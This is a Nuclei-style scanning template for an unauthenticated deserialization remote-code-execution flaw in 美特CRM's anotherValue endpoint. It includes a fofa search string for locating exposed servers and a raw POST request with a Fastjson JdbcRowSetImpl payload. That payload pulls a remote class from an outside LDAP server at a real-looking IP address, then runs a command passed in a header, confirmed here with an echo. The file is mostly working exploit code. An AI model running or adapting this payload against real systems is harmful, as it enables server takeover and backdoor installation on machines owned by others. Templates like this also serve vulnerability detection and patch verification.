id: MetaCRM-anotherValue-RCE

info:
  name: 美特CRM客户关系管理系统 anotherValue 反序列化
  author: HuanXiong
  severity: critical
  description: |-
    fofa: body="/common/scripts/basic.js"
    美特CRM客户关系管理系统 anotherValue 接口处存在反序列化漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
  reference:
    - 
  tags: RCE

http:
  - raw:
      - |
        POST /eai/someValue/anotherValue HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/json
        Connection: close
        cmd: echo 12321

        {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.97.24.52:1389/TomcatBypass/TomcatEcho","autoCommit":true}}

    matchers:
      - type: dsl
        name: 反序列化
        dsl:
          - 'status_code==200 && contains_all(body,"12321")'